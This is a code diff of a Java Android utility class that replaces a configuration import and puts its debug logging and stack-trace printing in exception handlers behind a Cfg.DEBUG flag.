@@ -16,10 +16,9 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.security.SecureRandom;
 
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
-
 import android.util.Log;
+
+import com.android.service.auto.Cfg;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -48,8 +47,8 @@ public final class Utils {
 		try {
 			bufferByteStream.close();
 		} catch (final IOException ioe) {
-			if(AutoConfig.DEBUG) { ioe.printStackTrace(); }
-			Log.d("QZ", TAG + " IOException() caught in Utils.BufferToDataInputStream()");
+			if(Cfg.DEBUG) { ioe.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " IOException() caught in Utils.BufferToDataInputStream()");
 		}
 
 		return bufferDataStream;
@@ -123,8 +122,8 @@ public final class Utils {
 
 			return byteArrayOutputStream.toByteArray();
 		} catch (final IOException e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " IOException() caught in Utils.RawResourceToBuffer()");
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " IOException() caught in Utils.RawResourceToBuffer()");
 			return null;
 		}
 	}
@@ -203,8 +202,8 @@ public final class Utils {
 		try {
 			Thread.sleep(t);
 		} catch (final InterruptedException e) {
-			Log.d("QZ", TAG + " sleep() throwed an exception");
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " sleep() throwed an exception");
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 	}
 
@@ -245,7 +244,7 @@ public final class Utils {
 			final int value = databuffer.readInt();
 			return value;
 		} catch (final IOException ex) {
-			Log.d("QZ", TAG + " Error: " +ex.toString());
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " +ex.toString());
 		}
 
 		return 0;
